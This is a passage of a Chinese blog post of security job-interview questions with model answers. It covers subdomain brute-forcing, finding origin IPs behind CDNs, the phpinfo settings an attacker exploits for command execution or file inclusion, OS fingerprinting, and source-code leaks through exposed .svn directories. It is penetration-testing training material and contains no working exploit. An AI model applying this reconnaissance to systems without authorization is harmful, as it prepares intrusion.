<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>全网二次首发！！！最全的网安面试题附参考答案（涵盖护网、红队、逆向、密码学、二进制）-杨CC | 杨CC 技术录</title><meta name="author" content="杨CC"><meta name="copyright" content="杨CC"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="全网首发！！！最全的网安面试题附参考答案（涵盖护网、红队、逆向、密码学、二进制）-杨CC">
<meta property="og:type" content="article">
<meta property="og:title" content="全网二次首发！！！最全的网安面试题附参考答案（涵盖护网、红队、逆向、密码学、二进制）-杨CC">
<meta property="og:url" content="https://ycc77.com/2025/09/26/27-%E6%9C%80%E5%85%A8%E7%9A%84%E7%BD%91%E5%AE%89%E9%9D%A2%E8%AF%95%E9%A2%98%E9%99%84%E5%8F%82%E8%80%83%E7%AD%94%E6%A1%88/index.html">
<meta property="og:site_name" content="杨CC 技术录">
<meta property="og:description" content="全网首发！！！最全的网安面试题附参考答案（涵盖护网、红队、逆向、密码学、二进制）-杨CC">
<meta property="og:locale">
<meta property="og:image" content="https://pic1.imgdb.cn/item/68a7ff2358cb8da5c8422ed0.png">
<meta property="article:published_time" content="2025-09-26T03:50:30.000Z">
<meta property="article:modified_time" content="2025-09-26T09:48:52.606Z">
<meta property="article:author" content="杨CC">
<meta property="article:tag" content="网安面试">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic1.imgdb.cn/item/68a7ff2358cb8da5c8422ed0.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "全网二次首发！！！最全的网安面试题附参考答案（涵盖护网、红队、逆向、密码学、二进制）-杨CC",
  "url": "https://ycc77.com/2025/09/26/27-%E6%9C%80%E5%85%A8%E7%9A%84%E7%BD%91%E5%AE%89%E9%9D%A2%E8%AF%95%E9%A2%98%E9%99%84%E5%8F%82%E8%80%83%E7%AD%94%E6%A1%88/",
  "image": "https://pic1.imgdb.cn/item/68a7ff2358cb8da5c8422ed0.png",
  "datePublished": "2025-09-26T03:50:30.000Z",
  "dateModified": "2025-09-26T09:48:52.606Z",
  "author": [
    {
      "@type": "Person",
      "name": "杨CC",
      "url": "https://Ycc77.com"
    }
  ]
}</script><link rel="shortcut icon" href="https://pic1.imgdb.cn/item/68a3e56758cb8da5c834abbf.png"><link rel="canonical" href="https://ycc77.com/2025/09/26/27-%E6%9C%80%E5%85%A8%E7%9A%84%E7%BD%91%E5%AE%89%E9%9D%A2%E8%AF%95%E9%A2%98%E9%99%84%E5%8F%82%E8%80%83%E7%AD%94%E6%A1%88/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '全网二次首发！！！最全的网安面试题附参考答案（涵盖护网、红队、逆向、密码学、二进制）-杨CC',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><!-- 异步加载统计脚本--><script async src="https://0198bc58-ac63-71ed-a536-46941550f9e1.ustat1.com/ustat.js"></script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://pic1.imgdb.cn/item/68a3e56758cb8da5c834abbf.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://ycc77.cn"><span> 杨CC资源站</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://pic1.imgdb.cn/item/68a7ff2358cb8da5c8422ed0.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://pic1.imgdb.cn/item/68a3e56758cb8da5c834abbf.png" alt="Logo"><span class="site-name">杨CC 技术录</span></a><a class="nav-page-title" href="/"><span class="site-name">全网二次首发！！！最全的网安面试题附参考答案（涵盖护网、红队、逆向、密码学、二进制）-杨CC</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://ycc77.cn"><span> 杨CC资源站</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">全网二次首发！！！最全的网安面试题附参考答案（涵盖护网、红队、逆向、密码学、二进制）-杨CC</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-09-26T03:50:30.000Z" title="Created 2025-09-26 11:50:30">2025-09-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-09-26T09:48:52.606Z" title="Updated 2025-09-26 17:48:52">2025-09-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">渗透工具</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2025-09-26 17:48:52&quot;}" hidden></div><h1 id="1-杨CC有话说"><a href="#1-杨CC有话说" class="headerlink" title="1- 杨CC有话说"></a>1- 杨CC有话说</h1><blockquote>
<p>全网二次首发！！！最全的网安面试题附参考答案（涵盖护网、红队、逆向、密码学、二进制）<br>上万道安全面试题已经全部为您划分好，适用于网络安全所有岗位！！！<br></p>
<br>
HR：请问…………
<br>
我：叽里咕噜说啥呢，看看八股文上写了没
<br>
原网站:http://113.45.17.228:4000<br>
原Github 地址: https://github.com/duckpigdog/Sec-Interview<br>
原作者:duckpigdog<br></blockquote>
<h1 id="2-信息收集系列"><a href="#2-信息收集系列" class="headerlink" title="2- 信息收集系列"></a>2- 信息收集系列</h1><h3 id="如何处理子域名爆破的泛解析问题"><a href="#如何处理子域名爆破的泛解析问题" class="headerlink" title="如何处理子域名爆破的泛解析问题"></a>如何处理子域名爆破的泛解析问题</h3><p><strong>1. 泛解析的探测与识别</strong></p>
<p>在进行子域名爆破之前，第一步是确定目标域名是否开启了泛解析</p>
<p><strong>操作方法：</strong></p>
<ol>
<li><strong>随机生成一个不存在的子域名</strong>：例如，<code>random-string-123.example.com</code>。这个字符串要足够随机且复杂，以确保它不可能是真实存在的子域名</li>
<li><strong>对其进行 DNS 查询</strong>：使用 <code>ping</code>、<code>dig</code> 或 <code>nslookup</code> 等命令来查询其 IP 地址</li>
<li><strong>记录返回的 IP 地址</strong>：如果返回了一个 IP 地址，那么这个地址很可能就是泛解析的地址</li>
</ol>
<p>为了提高准确性，你可以多生成几个随机子域名并重复上述步骤。如果它们都解析到相同的 IP 地址，那么就可以确认泛解析已开启，且你已经找到了泛解析的 IP 地址</p>
<p><strong>2. 爆破过程中的泛解析过滤</strong></p>
<p>确认泛解析后，在进行子域名爆破时，你需要过滤掉所有解析到泛解析 IP 地址的结果</p>
<p><strong>操作方法：</strong></p>
<ol>
<li><strong>使用专门的工具</strong>：许多现代的子域名爆破工具，如 <strong>Subfinder</strong>、<strong>Massdns</strong>、<strong>Amas</strong> 等，都内置了泛解析过滤功能。它们会在爆破前自动进行泛解析检测，并在爆破过程中自动过滤掉泛解析结果</li>
<li><strong>手动处理（脚本化）</strong>：如果你使用的是不具备自动过滤功能的工具，或者想自己编写脚本，可以采用以下策略：<ul>
<li><strong>第一步：获取 IP 列表</strong><ul>
<li>运行你的爆破工具，例如 <code>dnsrecon</code> 或 <code>fierce</code>，并将所有解析出的子域名及其 IP 地址保存到一个文件中</li>
</ul>
</li>
<li><strong>第二步：过滤泛解析</strong><ul>
<li>编写一个简单的脚本（Python、Bash 等）</li>
<li>遍历文件中的每一行数据（<code>子域名 IP</code>）</li>
<li>对比每个 IP 地址，如果它等于之前探测到的泛解析 IP 地址，就将其所在的行删除或标记</li>
<li>最后，你剩下的就是非泛解析的、真实存在的子域名</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>一个简单的 Python 脚本示例：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_wildcard</span>(<span class="params">input_file, wildcard_ip</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    过滤包含泛解析 IP 的子域名</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = f.readlines()</span><br><span class="line"></span><br><span class="line">        filtered_domains = []</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            parts = line.strip().split()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">2</span>:</span><br><span class="line">                domain, ip = parts[<span class="number">0</span>], parts[<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> ip != wildcard_ip:</span><br><span class="line">                    filtered_domains.append(domain)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> filtered_domains</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: The file &#x27;<span class="subst">&#123;input_file&#125;</span>&#x27; was not found.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python filter_domains.py &lt;input_file&gt; &lt;wildcard_ip&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    input_file = sys.argv[<span class="number">1</span>]</span><br><span class="line">    wildcard_ip = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    real_domains = filter_wildcard(input_file, wildcard_ip)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Found the following real subdomains:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> domain <span class="keyword">in</span> real_domains:</span><br><span class="line">        <span class="built_in">print</span>(domain)</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="如何绕过-CDN-查找真实-IP"><a href="#如何绕过-CDN-查找真实-IP" class="headerlink" title="如何绕过 CDN 查找真实 IP"></a>如何绕过 CDN 查找真实 IP</h3><p><strong>1. 子域名查询</strong></p>
<ul>
<li><strong>原理</strong>: 很多时候，一个网站的主域名使用了 CDN，但其子域名（例如 <code>blog.example.com</code>、<code>ftp.example.com</code> 或 <code>mail.example.com</code>）却没有使用。这些子域名可能与主域名部署在同一个服务器上，或者在同一个 IP 段内。</li>
<li><strong>方法</strong>:<ul>
<li>使用自动化工具（如 <code>Sublist3r</code>、<code>Amass</code>、<code>OneForAll</code>）进行大规模子域名扫描</li>
<li>通过在线的子域名查询服务（如 <strong>站长之家</strong>、<strong>VirusTotal</strong>）进行查询</li>
<li>然后对这些子域名进行 <code>ping</code> 或 <code>nslookup</code>，如果返回的 IP 地址与主域名不同，且多次查询结果稳定，就可能找到了真实 IP</li>
</ul>
</li>
</ul>
<p><strong>2. 邮件头信息</strong></p>
<ul>
<li><strong>原理</strong>: 很多网站的邮件服务器（如 <code>SMTP</code>）与 Web 服务器部署在同一台机器上，而邮件服务器通常不使用 CDN</li>
<li><strong>方法</strong>:<ul>
<li>尝试给目标网站的邮箱（如 <code>admin@example.com</code>）发送一封邮件</li>
<li>在你的邮箱中查看这封邮件的<strong>原始邮件头（Original Headers）</strong></li>
<li>在邮件头中寻找 <strong><code>Received: from</code></strong> 字段。这个字段记录了邮件在传输过程中经过的服务器 IP 地址。通常，第一个 <code>Received: from</code> 后面的 IP 地址就是邮件服务器的真实 IP，而这个 IP 很可能就是网站的真实 IP</li>
</ul>
</li>
</ul>
<p><strong>3. 历史 DNS 记录查询</strong></p>
<ul>
<li><strong>原理</strong>: 一个网站在上线 CDN 之前，其 DNS A 记录直接指向的就是真实 IP。一些服务会保存这些历史记录</li>
<li><strong>方法</strong>:<ul>
<li>使用在线服务（如 <strong><code>SecurityTrails</code></strong>、<strong><code>WhoisXML API</code></strong> 或 <strong><code>ViewDNS</code></strong>）查询域名的历史 DNS 解析记录</li>
<li>通过这些历史记录，你可以找到在 CDN 启用之前网站使用的真实 IP 地址</li>
</ul>
</li>
</ul>
<p><strong>4. SSL 证书查询</strong></p>
<ul>
<li><strong>原理</strong>: SSL 证书可能会包含一些指向源站的信息，例如在某些情况下，证书颁发者会记录申请者的 IP 地址</li>
<li><strong>方法</strong>:<ul>
<li>通过在线服务（如 <strong><code>Censys</code></strong>、<strong><code>Shodan</code></strong>）对目标域名进行 SSL 证书查询</li>
<li>查看证书的 <strong><code>subjectAltName</code></strong> 字段，或者检查是否有其他关联信息泄露了真实 IP</li>
<li>在某些情况下，如果目标网站使用了与源站 IP 绑定的证书，可以在 Shodan 等搜索引擎中直接搜索证书哈希或序列号来定位真实 IP</li>
</ul>
</li>
</ul>
<hr>
<h3 id="phpinfo-页面你会关注哪些信息"><a href="#phpinfo-页面你会关注哪些信息" class="headerlink" title="phpinfo 页面你会关注哪些信息"></a>phpinfo 页面你会关注哪些信息</h3><p><strong>1. PHP 配置和安全设置</strong></p>
<p>这些信息直接决定了攻击的难度和可用方法</p>
<ul>
<li><strong><code>disable_functions</code></strong>: 这是最关键的信息。如果这个列表为空，或者只禁用了少数函数，那么我就可以直接使用像 <code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>passthru()</code> 等命令执行函数来获取 WebShell，进行系统命令执行</li>
<li><strong><code>allow_url_fopen</code> 和 <code>allow_url_include</code></strong>: 如果这两个选项都为 <code>On</code>，则存在<strong>远程文件包含 (RFI)</strong> 漏洞的可能性。攻击者可以从远程服务器加载恶意 PHP 文件并执行</li>
<li><strong><code>open_basedir</code></strong>: 如果这个选项设置了，它会限制 PHP 脚本只能在指定的目录及其子目录中操作。这能有效限制攻击者的权限，但我会寻找绕过它的方法</li>
<li><strong><code>display_errors</code></strong>: 如果这个选项是 <code>On</code>，服务器会显示详细的错误信息，包括文件路径、数据库查询语句等。这些信息对于 SQL 注入、文件包含等漏洞的调试和利用非常有帮助</li>
<li><strong><code>expose_php</code></strong>: 如果这个选项为 <code>On</code>，<code>phpinfo()</code> 页面会暴露 PHP 的<strong>精确版本号</strong>（例如 PHP&#x2F;8.1.12）。这使得我能快速在漏洞数据库（如 CVEs）中查找该版本已知的安全漏洞，并针对性地进行攻击</li>
</ul>
<p><strong>2. 服务器环境信息</strong></p>
<p>这些信息帮助我了解 PHP 运行在什么样的环境中，以及我能获得多大的权限</p>
<ul>
<li><strong><code>SERVER_SOFTWARE</code></strong>: 告诉我 Web 服务器的类型和版本，例如 Apache、Nginx、IIS 等。这些服务器本身也可能存在漏洞</li>
<li><strong><code>_SERVER[&quot;DOCUMENT_ROOT&quot;]</code></strong>: 暴露了网站的根目录路径，这是进行<strong>本地文件包含 (LFI)</strong> 和目录遍历攻击的关键信息</li>
<li><strong><code>User</code> 和 <code>Group</code></strong>: <code>phpinfo()</code> 会显示 PHP 进程是以哪个用户和用户组运行的。这决定了我能执行哪些操作，例如是否可以读取其他用户的文件、是否可以写入某些目录等</li>
<li><strong><code>PATH</code></strong>: 环境变量 <code>PATH</code> 包含了系统命令的搜索路径，如果我能执行命令，这能帮助我快速找到像 <code>whoami</code>、<code>ls</code>、<code>id</code> 等常用命令</li>
</ul>
<p><strong>3. 已加载的模块和扩展</strong></p>
<p>这些信息揭示了 PHP 环境的功能，以及潜在的攻击面</p>
<ul>
<li><strong><code>cURL</code>、<code>sockets</code></strong>: 如果这些扩展存在，我可能会尝试<strong>服务器端请求伪造 (SSRF)</strong> 攻击，通过服务器向内部网络发起请求，探测内网服务</li>
<li><strong><code>pdo</code>、<code>mysqli</code>、<code>sqlsrv</code> 等数据库扩展</strong>: 确认网站使用了哪种数据库，为后续的<strong>SQL 注入</strong>攻击提供目标</li>
<li><strong><code>GD</code>、<code>ImageMagick</code> 等图像处理扩展</strong>: 如果存在，可能会有<strong>图像处理库漏洞</strong>，导致命令执行。</li>
</ul>
<p><strong>4. 文件系统和路径信息</strong></p>
<ul>
<li><strong><code>_SERVER[&quot;SCRIPT_FILENAME&quot;]</code></strong>: 暴露了当前脚本在服务器上的<strong>绝对路径</strong>。这是进行本地文件包含、路径遍历、以及了解服务器文件结构的重要线索</li>
<li><strong><code>upload_tmp_dir</code></strong>: 如果我能找到一个文件上传漏洞，这个选项会告诉我临时文件上传的目录。有时候，我可以在这个目录上传并执行一个 WebShell</li>
</ul>
<hr>
<h3 id="如何判断目标操作系统"><a href="#如何判断目标操作系统" class="headerlink" title="如何判断目标操作系统"></a>如何判断目标操作系统</h3><p><strong>1. 被动指纹识别</strong></p>
<p>这是在不与目标系统直接交互或发送特定探测请求的情况下进行识别，通常通过分析网络流量来完成</p>
<ul>
<li><strong>TTL (Time-To-Live)</strong>：这是最常用且最简单的方法。TTL 是 IP 包在网络中存活的最大跳数。不同的操作系统有不同的初始 TTL 值<ul>
<li><strong>Linux&#x2F;Unix</strong>：通常为 <strong>64</strong></li>
<li><strong>Windows</strong>：通常为 <strong>128</strong></li>
<li><strong>老版本 Windows XP</strong>：也可能是 <strong>64</strong></li>
<li><strong>思科设备</strong>：通常为 <strong>255</strong></li>
<li><strong>判断方法</strong>：在你的机器上 <code>ping</code> 目标，或者通过 <code>tracert</code>&#x2F;<code>traceroute</code>，观察返回包的 TTL 值。例如，你 <code>ping</code> 一个服务器，返回的 TTL 是 118，那么初始值很可能是 128，表明目标是 Windows</li>
</ul>
</li>
<li><strong>TCP 窗口大小 (Window Size)</strong>：不同的操作系统在进行 TCP 握手时，其初始的 TCP 窗口大小也不同<ul>
<li><strong>Linux</strong>：通常为 <strong>5840</strong></li>
<li><strong>Windows</strong>：通常为 <strong>65535</strong></li>
<li><strong>判断方法</strong>：通过抓包工具（如 Wireshark）分析 TCP 三次握手的第一个 SYN-ACK 包，观察其 Window Size 字段</li>
</ul>
</li>
</ul>
<p>判断目标操作系统是渗透测试中的一个基本步骤，这可以帮助你选择正确的漏洞利用方法和工具。以下是几种从渗透测试角度判断目标操作系统的方法，从被动到主动，由浅入深</p>
<p><strong>2. 主动指纹识别</strong></p>
<p>这需要你向目标发送特定的探测请求，并分析其响应</p>
<ul>
<li><strong>Nmap</strong>：这是最强大的操作系统指纹识别工具。Nmap 使用其内置的脚本和复杂的算法来识别操作系统<ul>
<li><strong>命令</strong>：<code>nmap -O [目标 IP]</code></li>
<li><strong>原理</strong>：Nmap 会发送一系列精心构造的 TCP&#x2F;IP 数据包到目标，并分析响应的 TTL、TCP 窗口大小、序列号（IP ID）、TCP 时间戳等多种特征，然后将这些特征与 Nmap 数据库中的操作系统指纹进行比对</li>
</ul>
</li>
<li><strong>HTTP 响应头</strong>：如果目标是 Web 服务器，其 HTTP 响应头通常会泄露操作系统和 Web 服务器软件的信息<ul>
<li><strong><code>Server</code> 头</strong>：可能包含 <code>Apache/2.4.6 (CentOS)</code> 或 <code>Microsoft-IIS/10.0</code> 等信息</li>
<li><strong><code>X-Powered-By</code> 头</strong>：可能包含 <code>ASP.NET</code> 或 <code>PHP</code> 等信息</li>
<li><strong>判断方法</strong>：使用 <code>curl</code> 命令或 Burp Suite 等工具发送请求，然后查看响应头</li>
</ul>
</li>
</ul>
<hr>
<h3 id="如何判断是否使用-CDN"><a href="#如何判断是否使用-CDN" class="headerlink" title="如何判断是否使用 CDN"></a>如何判断是否使用 CDN</h3><p><strong>1. DNS 解析查询</strong></p>
<p>CDN 的核心原理就是将你的请求解析到离你最近的节点服务器</p>
<ul>
<li><strong>多次查询</strong>: 在不同地区或使用不同的 DNS 解析服务器（如 Google DNS, 阿里云 DNS）多次对目标域名进行 <code>ping</code> 或 <code>nslookup</code> 查询</li>
<li><strong>观察 IP 地址</strong>: 如果每次查询返回的 IP 地址都不同，或者返回多个 IP 地址，那么很可能目标使用了 CDN。因为 CDN 会根据你的地理位置，将域名解析到不同的边缘节点服务器</li>
<li><strong>查询CNAME</strong>: 许多 CDN 服务商会使用一个特殊的 CNAME（别名记录）来指向他们的 CDN 节点。例如，你查询 <code>www.example.com</code> 的 CNAME，如果返回一个类似 <code>www.example.com.cdn.cloudflare.net</code> 或 <code>w.alikun.com</code> 的域名，那么目标就使用了 CDN</li>
</ul>
<p>你可以使用在线工具如 <strong>nslookup.io</strong>、<strong><code>ping</code> 命令</strong> 或 <strong><code>nslookup</code> 命令</strong> 来进行测试</p>
<p><strong>2. HTTP 响应头分析</strong></p>
<p>许多 CDN 服务商会在 HTTP 响应头中添加特定的信息来标识自己</p>
<ul>
<li><strong><code>Server</code> 字段</strong>: 一些 CDN 会在 <code>Server</code> 字段中暴露自己的身份，例如 <code>Server: cloudflare</code> 或 <code>Server: Tengine</code>（阿里巴巴的 CDN）</li>
<li><strong><code>X-Powered-By</code> 或自定义字段</strong>: 有些 CDN 可能会添加自定义的 HTTP 头，如 <code>X-Cache</code>、<code>X-CDN</code> 或 <code>Via</code> 来指示内容是否由 CDN 缓存</li>
<li><strong><code>Set-Cookie</code></strong>: 一些 CDN 服务会在响应中设置特定的 Cookie 来追踪用户，这也能作为判断依据</li>
</ul>
<p>你可以使用 <code>curl</code> 命令或浏览器的开发者工具来查看这些 HTTP 头信息。例如：<code>curl -I http://www.example.com</code></p>
<p><strong>3. IP 地址归属地查询</strong></p>
<ul>
<li><strong>IP 库查询</strong>: 如果通过 DNS 查询获得了目标 IP 地址，可以利用 IP 地址查询工具来判断其归属地</li>
<li><strong>观察归属地</strong>: 如果 IP 地址归属地是一个知名的 CDN 服务商（如 Cloudflare, Akamai, AWS），那么目标就使用了 CDN</li>
</ul>
<p><strong>4. SSL&#x2F;TLS 证书信息</strong></p>
<ul>
<li><strong>证书颁发者</strong>: 有些 CDN 服务商会提供 SSL&#x2F;TLS 证书服务，如果证书的颁发者是 Cloudflare 或 Let’s Encrypt 等，这可能暗示使用了 CDN</li>
</ul>
<hr>
<h3 id="有没有了解过-SVN-GIT-源代码泄露"><a href="#有没有了解过-SVN-GIT-源代码泄露" class="headerlink" title="有没有了解过 SVN&#x2F;GIT 源代码泄露"></a>有没有了解过 SVN&#x2F;GIT 源代码泄露</h3><p><strong>SVN 源代码泄露</strong></p>
<p>SVN（Subversion）是一个集中式版本控制系统，它的核心目录是 <code>.svn</code>。当开发者在 Web 服务器的根目录下直接使用 <code>svn checkout</code> 或 <code>svn update</code> 命令时，<code>.svn</code> 目录及其所有子目录也会被同步到服务器上。如果 Web 服务器没有正确配置，这个隐藏目录就会被公网访问</p>
<p><strong>漏洞原理</strong></p>
<p><code>/.svn/</code> 目录下存储了代码的元数据，这些数据通常以 <code>.svn/entries</code>、<code>.svn/text-base/</code> 等形式存在。攻击者可以通过递归下载这些文件来还原出整个代码库</p>
<ul>
